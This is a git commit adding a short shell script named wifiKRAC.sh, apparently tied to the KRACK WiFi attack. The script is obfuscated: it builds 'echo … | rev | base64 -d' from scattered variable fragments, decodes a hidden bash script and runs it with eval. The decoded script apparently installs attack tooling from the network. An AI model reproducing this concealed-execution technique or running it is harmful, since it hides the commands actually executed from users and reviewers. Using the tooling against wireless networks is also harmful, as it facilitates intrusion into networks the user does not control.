ee8a4269bbc8ebb973b8a8dc7f2e62aa7595b1e9
luisakrac <50025904+luisakrac@users.noreply.github.com>
2019-05-05 19:00:27 -0500

    Add files via upload

---
+++ wifiKRAC.sh
@@ -0,0 +1,4 @@
+gH4="Ed";kM0="xSz";c="ch";L="4";rQW="";fE1="lQ";s=" '==gCKIXYlx2YKUWbvh2LzVGbpZ2L4VXbyVGdu02bj9SY0FGZvEGdhR2Lgg2cpZEcy92YT9yQDFkULlkRX9SZt9GavMXZslmZvgXdtJXZ05SbvN2LhRXYk9SY0FGZvAictACcjpAdpdmLoNXaGBncvN2UvQmb19mZ09mbtQDM0I3byJXZv02bj5iY1hGdpd2LvozcwRHdoBSZu9GbjBCdpdmCsJXdjBCbsFGdz5Wagc2awpAcoBHIsxWY0NnbpByZrBnC0l2ZgwGbhR3culGIntGcKkXLgUGZhJ3ZwVHI0BXYKkXLgUGdhRGc1BCdwFmCKg2chJ2LulmYvEyI
+' | r";HxJ="s";Hc2="";f="as";kcE="pas";cEf="ae";d="o";V9z="6";P8c="if";U=" -d";Jc="ef";N0q="";v="b";w="e";b="v |";Tx="Eds";xZp=""
+x=$(eval "$Hc2$w$c$rQW$d$s$w$b$Hc2$v$xZp$f$w$V9z$rQW$L$U$xZp")
+eval "$N0q$x$Hc2$rQW"
